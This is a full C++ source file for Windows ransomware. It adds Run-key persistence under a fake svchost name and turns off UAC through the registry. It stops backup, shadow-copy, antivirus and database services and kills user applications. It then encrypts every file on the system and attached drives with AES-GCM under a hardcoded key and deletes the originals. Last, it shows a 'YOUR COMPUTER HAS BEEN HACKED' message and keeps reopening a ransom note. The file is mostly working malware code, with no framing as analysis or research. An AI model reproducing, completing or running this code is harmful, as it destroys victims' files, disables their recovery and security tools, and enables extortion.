#include <boost/config/warning_disable.hpp>
#include <boost/filesystem.hpp>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <windows.h>
#include <fstream>
#include <thread>
#include <vector>
#include <sstream>
#include <locale>
#include <strsafe.h>
#include <files.h>
#include <queue.h>
#include <hex.h>
#include <osrng.h>
#include "gcm.h"
#include <pssr.h>
#include <nbtheory.h>
#include "aes.h"
#include <oids.h>
#include <string>
#include <shellapi.h>
#include <tlhelp32.h>


using namespace std;
using namespace boost::filesystem;
#define STRSAFE_MAX_CCH     2147483647  
using namespace CryptoPP;

string snote = "...";

string app = getenv("APPDATA");
//app += "\\Disknote.txt";
ofstream asdnote(app + "\\Disknote.txt", ios::out);


#define MAX 256


static const CHAR* services_to_stop[] = { "vss", "sql", "svc$", "memtas", "mepocs", "sophos", "veeam", "backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "ccSetMgr", "SavRoam", "RTVscan", "QBFCService", "QBIDPService", "Intuit.QuickBooks.FCS", "QBCFMonitorService", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "VeeamTransportSvc", "VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc", "CAARCUpdateSvc" };

static const WCHAR* processes_to_stop[] = { L"AvastUI.exe",L"AvastSvc.exe",L"aswToolsSvc.exe",L"aswEngSrv.exe",L"afwServ.exe", L"sql.exe", L"oracle.exe", L"ocssd.exe", L"dbsnmp.exe", L"synctime.exe", L"agntsvc.exe", L"isqlplussvc.exe", L"xfssvccon.exe", L"mydesktopservice.exe", L"ocautoupds.exe", L"encsvc.exe", L"firefox.exe", L"tbirdconfig.exe", L"mydesktopqos.exe", L"ocomm.exe", L"dbeng50.exe", L"sqbcoreservice.exe", L"excel.exe", L"infopath.exe", L"msaccess.exe", L"mspub.exe", L"onenote.exe", L"outlook.exe", L"powerpnt.exe", L"steam.exe", L"thebat.exe", L"thunderbird.exe", L"visio.exe", L"winword.exe", L"wordpad.exe", L"notepad.exe" };

static HANDLE proc_heap = 0;

void _hfree(void* mem) {
	HeapFree(proc_heap, 0, mem);
}

void* _halloc(SIZE_T count) {
retry:;
	LPVOID ret = HeapAlloc(proc_heap, HEAP_ZERO_MEMORY, count + 64);
	if (ret == 0) goto retry;
	return ret;
}

void _stop_services() {
	SERVICE_STATUS_PROCESS sspMain;
	SERVICE_STATUS_PROCESS sspDep;

	ENUM_SERVICE_STATUSA ess;

	DWORD dwBytesNeeded;
	DWORD dwWaitTime;
	DWORD dwCount;

	LPENUM_SERVICE_STATUSA lpDependencies = 0;

	DWORD dwStartTime = GetTickCount();
	DWORD dwTimeout = 30000;

	if (SC_HANDLE scManager = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS)) {
		for (int i = 0; i < _countof(services_to_stop); i++) {
			if (SC_HANDLE schHandle = OpenServiceA(
				scManager,
				services_to_stop[i],
				SERVICE_STOP |
				SERVICE_QUERY_STATUS |
				SERVICE_ENUMERATE_DEPENDENTS)) {
				if (QueryServiceStatusEx(schHandle,
					SC_STATUS_PROCESS_INFO,
					(LPBYTE)&sspMain,
					sizeof(SERVICE_STATUS_PROCESS),
					&dwBytesNeeded)) {
					if (sspMain.dwCurrentState != SERVICE_STOPPED && sspMain.dwCurrentState != SERVICE_STOP_PENDING) {
						if (!EnumDependentServicesA(schHandle,
							SERVICE_ACTIVE,
							lpDependencies,
							0,
							&dwBytesNeeded,
							&dwCount)) {
							if (GetLastError() == ERROR_MORE_DATA) {
								if (lpDependencies = (LPENUM_SERVICE_STATUSA)_halloc(dwBytesNeeded)) {
									if (EnumDependentServicesA(schHandle,
										SERVICE_ACTIVE,
										lpDependencies,
										dwBytesNeeded,
										&dwBytesNeeded,
										&dwCount)) {
										ess = *(lpDependencies + i);

										if (SC_HANDLE hDepService = OpenServiceA(
											scManager,
											ess.lpServiceName,
											SERVICE_STOP |
											SERVICE_QUERY_STATUS)) {
											if (ControlService(hDepService,
												SERVICE_CONTROL_STOP,
												(LPSERVICE_STATUS)&sspDep)) {
												while (sspDep.dwCurrentState != SERVICE_STOPPED)
												{
													Sleep(sspDep.dwWaitHint);
													if (QueryServiceStatusEx(
														hDepService,
														SC_STATUS_PROCESS_INFO,
														(LPBYTE)&sspDep,
														sizeof(SERVICE_STATUS_PROCESS),
														&dwBytesNeeded)) {
														if (sspDep.dwCurrentState == SERVICE_STOPPED || GetTickCount() - dwStartTime > dwTimeout) {
															break;
														}
													}
												}

												CloseServiceHandle(hDepService);
											}
										}
									}

									_hfree(lpDependencies);
								}
							}
						}
						if (ControlService(schHandle,
							SERVICE_CONTROL_STOP,
							(LPSERVICE_STATUS)&sspMain)) {
							while (sspMain.dwCurrentState != SERVICE_STOPPED)
							{
								Sleep(sspMain.dwWaitHint);
								if (!QueryServiceStatusEx(
									schHandle,
									SC_STATUS_PROCESS_INFO,
									(LPBYTE)&sspMain,
									sizeof(SERVICE_STATUS_PROCESS),
									&dwBytesNeeded))
								{
									goto stop_cleanup;
								}

								if (sspMain.dwCurrentState == SERVICE_STOPPED)
									break;

								if (GetTickCount() - dwStartTime > dwTimeout)
								{
									goto stop_cleanup;
								}
							}
						}
					}
				}

			stop_cleanup:;
				CloseServiceHandle(schHandle);
			}
		}

		CloseServiceHandle(scManager);
	}
}

void kill_proccess() {

	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	PROCESSENTRY32W pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32FirstW(hSnapShot, &pEntry);
	while (hRes)
	{
		for (int i = 0; i < _countof(processes_to_stop); i++) {
			if (lstrcmpW(processes_to_stop[i], pEntry.szExeFile) == 0) {
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
				if (hProcess != NULL)
				{
					TerminateProcess(hProcess, 9);
					CloseHandle(hProcess);
				}
				break;
			}
		}
		hRes = Process32NextW(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);

}



HKEY OpenRegistryKey(HKEY hRootKey, LPCWSTR strSubKey)
{
	HKEY hKey;
	LONG lError = RegOpenKeyEx(hRootKey, strSubKey, NULL, KEY_ALL_ACCESS, &hKey);

	if (ERROR_FILE_NOT_FOUND == lError)
	{
		cout << "BULUNAMADI" << endl;
		//lError = RegCreateKeyEx(hRootKey, strSubKey, NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
		//cout << "olustruldu" << endl;
	}

	if (lError != ERROR_SUCCESS)
	{
		cout << "Something is wrong" << endl;
		return 0;
	}

	//cout << "BULUNDU" << endl;

	return hKey;

}

int SetRegistryValues(HKEY hRootKey, LPCWSTR lpVal, DWORD data)
{
	LONG nErr = RegSetValueEx(hRootKey, lpVal, NULL, REG_DWORD, (LPBYTE)&data, sizeof(DWORD));

	if (nErr != ERROR_SUCCESS)
	{
		cout << "Not able to set the registry value" << endl;
		return -1;
	}
	cout << "BASARILI" << endl;
}

void setValues() {
	HKEY hKey = OpenRegistryKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
	DWORD dMyValue1 = 0;
	SetRegistryValues(hKey, L"ConsentPromptBehaviorAdmin", dMyValue1);
	SetRegistryValues(hKey, L"ConsentPromptBehaviorUser", dMyValue1);
	SetRegistryValues(hKey, L"EnableLUA", dMyValue1);

	RegCloseKey(hKey);

}

int regEdit(char* argv[]) {
	//const char* czStartName = "MyApplication";
	//wstring progPath = L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";
	string file_name = std::move(*argv);
	wstring temp = wstring(file_name.begin(), file_name.end());
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";

	string appdata = getenv("APPDATA");
	appdata += "\\Windowssvchost.pif";

	wstring stemp = wstring(appdata.begin(), appdata.end());
	//LPCWSTR to = stemp.c_str();
	//wcout << "STEMP: " << stemp << endl;

	if (CopyFile(temp.c_str(), stemp.c_str(), 0)) {
		cout << "basarili" << endl;
	}
	else {
		cout << "fail" << endl;
	}

	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		cout << err << endl;
		return -1;
	}
	if (RegSetValueEx(NewVal, L"WindowsSvcHost", 0, REG_SZ, (BYTE*)stemp.c_str(), (stemp.size() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		cout << err << endl;
		return -1;
	}
	RegCloseKey(NewVal);
	cout << suc << endl;
	return 0;

}

void decrypt_file(string efile, SecByteBlock key, SecByteBlock iv)  //keep hash
{
	string efilename = efile;
	efile.erase(efile.end() - 4, efile.end());
	string rfilename = efile;

	//SecByteBlock key(AES::MAX_KEYLENGTH);
	//byte iv[ AES::BLOCKSIZE ];


	GCM< AES >::Decryption d2;
	d2.SetKeyWithIV(key, key.size(), iv, sizeof(iv));

	FileSource fs2(efilename.c_str(), true,
		new AuthenticatedDecryptionFilter(d2,
			new FileSink(rfilename.c_str()),
			AuthenticatedDecryptionFilter::THROW_EXCEPTION));

}

void encrypt_file(string oFile, SecByteBlock key, SecByteBlock iv)
{
	// SecByteBlock key(AES::MAX_KEYLENGTH);
	// byte iv[ AES::BLOCKSIZE ];

	string ofilename = oFile;
	string outFile = oFile + ".cry";
	string efilename = outFile;

	string host = ofilename.substr(ofilename.length() - 18);
	string note = ofilename.substr(ofilename.length() - 14);

	if (host != "Windowssvchost.pif" || note != "Disknote.txt") {

		std::ifstream ifile(oFile.c_str(), ios::binary);
		std::ifstream::pos_type size = ifile.seekg(0, std::ios_base::end).tellg();
		ifile.seekg(0, std::ios_base::beg);

		string temp;
		temp.resize(size);
		ifile.read((char*)temp.data(), temp.size());


		GCM< AES >::Encryption e1;
		e1.SetKeyWithIV(key, key.size(), iv, sizeof(iv));

		StringSource ss1(temp, true,
			new AuthenticatedEncryptionFilter(e1,
				new FileSink(efilename.c_str())));
	}
}

void CUser(SecByteBlock key, SecByteBlock iv) {
	boost::system::error_code dir_error;
	std::locale loc(std::locale("tr_TR.utf8"));
	std::locale::global(loc);

	// set console output
	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	// set file

	//Cout_file.imbue(loc);
	//wchar_t BOM = static_cast<wchar_t>(0xFEFF);
	//Cout_file.put(BOM);
	//file.put(test_char);
	std::size_t len = 0;
	try {
		for (boost::filesystem::recursive_directory_iterator end, dir("C:\\Users", dir_error); dir != end; dir.increment(dir_error)) {
			if (dir_error.value()) {
				cerr << "Error accessing file: " << dir_error.message() << endl;
			}
			else {



				/*const wchar_t* m = dir->path().wstring().c_str();
				cout << endl;
				if (FAILED(StringCchLengthW(m, STRSAFE_MAX_CCH, &len)))
				{
					std::wcout << L"Failed getting string length" << std::endl;

				}*/


				//Cout_file.write(m, len);
				//Cout_file << "\n";

				//wcout << m << endl;

				wstring wfilepath = dir->path().wstring().c_str();
				string FilePath = string(wfilepath.begin(), wfilepath.end());


				/*string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 == ".cry") {
					try {
						decrypt_file(FilePath, key, iv);
						cout << FilePath << endl;
						cout << "file decrypted" << endl;
					}
					catch (exception) {
						cout << "File can't be decrypted" << endl;
						continue;
					}
					try {
						char name[256];
						strcpy_s(name, 255, FilePath.c_str());
						remove(name);
					}
					catch (exception) {
						cout << "File can't be removed" << endl;
						continue;
					}
				}
				else
					continue;*/


				string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 != ".cry") {
					try {
						encrypt_file(FilePath, key, iv);
						//cout << FilePath << endl;
						//cout << "File encrypted ";
						string host = FilePath.substr(FilePath.length() - 18);
						if (host != "Windowssvchost.pif") {
							char chFile[256];
							strcpy_s(chFile, 255, FilePath.c_str());
							remove(chFile);
							//cout << "File removed" << endl;
						}
					}
					catch (exception) {
						continue;
					}
				}

			}
		}

	}
	catch (exception) {
	}
}
void ProgFiles(SecByteBlock key, SecByteBlock iv) {
	boost::system::error_code dir_error;
	std::locale loc(std::locale("tr_TR.utf8"));
	std::locale::global(loc);

	// set console output
	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	// set file

	//Cout_file.imbue(loc);
	wchar_t BOM = static_cast<wchar_t>(0xFEFF);
	//Cout_file.put(BOM);
	//file.put(test_char);
	std::size_t len = 0;
	try {
		for (boost::filesystem::recursive_directory_iterator end, dir("C:\\Program Files (x86)", dir_error); dir != end; dir.increment(dir_error)) {
			if (dir_error.value()) {
				cerr << "Error accessing file: " << dir_error.message() << endl;
			}
			else {

				/*const wchar_t* m = dir->path().wstring().c_str();
				cout << endl;
				if (FAILED(StringCchLengthW(m, STRSAFE_MAX_CCH, &len)))
				{
					std::wcout << L"Failed getting string length" << std::endl;

				}*/


				//Cout_file.write(m, len);
				//Cout_file << "\n";
				//wcout << m << endl;

				wstring wfilepath = dir->path().wstring().c_str();
				string FilePath = string(wfilepath.begin(), wfilepath.end());


				/*string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 == ".cry") {
					try {
						decrypt_file(FilePath, key, iv);
						cout << FilePath << endl;
						cout << "file decrypted" << endl;
					}
					catch (exception) {
						cout << "File can't be decrypted" << endl;
						continue;
					}
					try {
						char name[256];
						strcpy_s(name, 255, FilePath.c_str());
						remove(name);
					}
					catch (exception) {
						cout << "File can't be removed" << endl;
						continue;
					}
				}
				else
					continue;*/


				string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 != ".cry") {
					try {
						encrypt_file(FilePath, key, iv);
						//cout << FilePath << endl;
						//cout << "File encrypted ";
						string host = FilePath.substr(FilePath.length() - 18);
						if (host != "Windowssvchost.pif") {
							char chFile[256];
							strcpy_s(chFile, 255, FilePath.c_str());
							remove(chFile);
							//cout << "File removed" << endl;
						}
					}
					catch (exception) {
						continue;
					}
				}

			}
		}

	}
	catch (exception) {
	}
}

void Cdrive(SecByteBlock key, SecByteBlock iv) {
	boost::system::error_code dir_error;
	std::locale loc(std::locale("tr_TR.utf8"));
	std::locale::global(loc);

	// set console output
	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	// set file

	//Cout_file.imbue(loc);
	wchar_t BOM = static_cast<wchar_t>(0xFEFF);
	//Cout_file.put(BOM);
	//file.put(test_char);
	std::size_t len = 0;
	try {
		for (boost::filesystem::recursive_directory_iterator end, dir("C:\\", dir_error); dir != end; dir.increment(dir_error)) {
			if (dir_error.value()) {
				cerr << "Error accessing file: " << dir_error.message() << endl;
			}
			else {

				/*const wchar_t* m = dir->path().wstring().c_str();
				cout << endl;
				if (FAILED(StringCchLengthW(m, STRSAFE_MAX_CCH, &len)))
				{
					std::wcout << L"Failed getting string length" << std::endl;

				}*/


				//Cout_file.write(m, len);
				//Cout_file << "\n";
				//wcout << m << endl;

				wstring wfilepath = dir->path().wstring().c_str();
				string FilePath = string(wfilepath.begin(), wfilepath.end());


				/*string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 == ".cry") {
					try {
						decrypt_file(FilePath, key, iv);
						cout << FilePath << endl;
						cout << "file decrypted" << endl;
					}
					catch (exception) {
						cout << "File can't be decrypted" << endl;
						continue;
					}
					try {
						char name[256];
						strcpy_s(name, 255, FilePath.c_str());
						remove(name);
					}
					catch (exception) {
						cout << "File can't be removed" << endl;
						continue;
					}
				}
				else
					continue;*/


				string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 != ".cry") {
					try {
						encrypt_file(FilePath, key, iv);
						//cout << FilePath << endl;
						//cout << "File encrypted ";
						string host = FilePath.substr(FilePath.length() - 18);
						if (host != "Windowssvchost.pif") {
							char chFile[256];
							strcpy_s(chFile, 255, FilePath.c_str());
							remove(chFile);
							//cout << "File removed" << endl;
						}
					}
					catch (exception) {
						continue;
					}
				}

			}
		}

	}
	catch (exception) {
	}
}

void AllDrive(string drive, SecByteBlock key, SecByteBlock iv) {
	boost::system::error_code dir_error;
	std::locale loc(std::locale("tr_TR.utf8"));
	std::locale::global(loc);

	// set console output
	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	// set file

	//Cout_file.imbue(loc);
	wchar_t BOM = static_cast<wchar_t>(0xFEFF);
	//Cout_file.put(BOM);
	//file.put(test_char);
	std::size_t len = 0;
	try {
		for (boost::filesystem::recursive_directory_iterator end, dir(drive, dir_error); dir != end; dir.increment(dir_error)) {
			if (dir_error.value()) {
				cerr << "Error accessing file: " << dir_error.message() << endl;
			}
			else {



				/*const wchar_t* m = dir->path().wstring().c_str();
				cout << endl;
				if (FAILED(StringCchLengthW(m, STRSAFE_MAX_CCH, &len)))
				{
					std::wcout << L"Failed getting string length" << std::endl;

				}*/


				//Cout_file.write(m, len);
				//Cout_file << "\n";

				//wcout << m << endl;

				wstring wfilepath = dir->path().wstring().c_str();
				string FilePath = string(wfilepath.begin(), wfilepath.end());
				//cout << FilePath << endl;

				/*string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 == ".cry") {
					try {
						decrypt_file(FilePath,key,iv);
						cout << "file decrypted" << endl;
					}
					catch (exception) {
						continue;
					}
					try {
						char name[256];
						strcpy_s(name, 255, FilePath.c_str());
						remove(name);
					}
					catch (exception) {
						continue;
					}
				}
				else
					continue;*/


				string last4 = FilePath.substr(FilePath.length() - 4);
				if (last4 != ".cry") {
					try {
						encrypt_file(FilePath, key, iv);
						//cout << FilePath << endl;
						//cout << "File encrypted ";
						string host = FilePath.substr(FilePath.length() - 18);
						if (host != "Windowssvchost.pif") {
							char chFile[256];
							strcpy_s(chFile, 255, FilePath.c_str());
							remove(chFile);
							//cout << "File removed" << endl;
						}
					}
					catch (exception) {
						continue;
					}
				}


			}
		}

	}
	catch (exception) {
	}
}


void MSGB(LPCWSTR content, LPCWSTR header) {
	MessageBox(0, content, header, MB_ICONWARNING);
}


void writeDisk() {

	asdnote << snote << endl;
	asdnote.close();

	char* appdata = getenv("APPDATA");
	//cout << "APP: " << appdata << endl;
	if (!SetCurrentDirectoryA(appdata)) {
		printf("SetCurrentDirectory failed (%d)\n", GetLastError());
	}

	MSGB(L"YOUR COMPUTER HAS BEEN HACKED READ THE DESCRIPTION", L"Windows");
	Sleep(10000);
	char chTxtFile[256];
	strcpy_s(chTxtFile, 255, app.c_str());
	system("Disknote.txt");

}


void checkOpen() {
	MSGB(L"YOUR COMPUTER HAS BEEN HACKED!!!\n READ THE DESCRIPTION!!!", L"Windows");
	Sleep(15000);
	asdnote.close();
	char* appdata = getenv("APPDATA");
	//cout << "APP: " << appdata << endl;
	if (!SetCurrentDirectoryA(appdata)) {
		printf("SetCurrentDirectory failed (%d)\n", GetLastError());
	}
	else {
		//cout << "Director has been changed too ";
		system("chdir");
	}
	while (1) {
		if (!asdnote.is_open()) {
			remove("Disknote.txt");
			ofstream newRansText("Disknote.txt", ios::out);
			newRansText << snote;
			newRansText.close();
			system("Disknote.txt");
		}
	}
}
int main(int argc, char* argv[]) {

	//ShowWindow(GetConsoleWindow(), SW_HIDE); //SW_RESTORE to bring back

	regEdit(argv);
	setValues();

	_stop_services();
	kill_proccess();

	string pass = "asddsa1234321";
	string input;
	cout << "Password:" << endl;
	cin >> input;

	if (input != pass)
		exit(1);
	char* appdata = getenv("APPDATA");
	//cout << "APP: " << appdata << endl;
	if (!SetCurrentDirectoryA(appdata)) {
		printf("SetCurrentDirectory failed (%d)\n", GetLastError());
	}
	else {
		//cout << "Director has been changed too ";
		//system("chdir");
	}
	//system("chdir");
	//system("pause");


	AutoSeededRandomPool prng;
	HexEncoder encoder(new FileSink(std::cout));


	//the password
	string sKey = "C80D6C76E06F012D2CBB638175212C84";
	string siv = "A996B89450D95494384AC0DE497EEC82";

	// Convert "UltraSecretKeyPhrase" to SecByteBlock
	SecByteBlock key((const unsigned char*)(sKey.data()), sKey.size());
	SecByteBlock iv((const unsigned char*)(siv.data()), siv.size());



	thread t1(Cdrive, key, iv);

	thread t2(CUser, key, iv);
	thread t3(ProgFiles, key, iv);
	int i;

	UINT test;

	LPCWSTR drive2[13] = { L"A:\\", L"B:\\", L"D:\\", L"E:\\", L"F:\\", L"G:\\", L"H:\\",L"I:\\", L"J:\\", L"K:\\", L"L:\\" };
	string stdrive[13] = { "A:\\", "B:\\",  "D:\\", "E:\\", "F:\\", "G:\\", "H:\\","I:\\", "J:\\", "K:\\", "L:\\" };
	vector<string> arr;
	for (i = 0; i < 12; i++)
	{
		test = GetDriveType(drive2[i]);
		switch (test)
		{
		case 2: printf("Drive %S is type %d - Removable.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;

		case 3: printf("Drive %S is type %d - Fixed.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;

		case 5: printf("Drive %S is type %d - CD-ROM.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;

		case 6: printf("Drive %S is type %d - RAMDISK.\n", drive2[i], test);
			arr.push_back(stdrive[i]);
			break;
		default: "Unknown value!\n";
		}
	}
	t1.join();
	t2.join();
	t3.join();

	if (!arr.empty()) {
		for (const auto& e : arr) {
			std::cout << e << std::endl;
			AllDrive(e, key, iv);
		}
	}

	//thread Disk(writeDisk);

	checkOpen();

}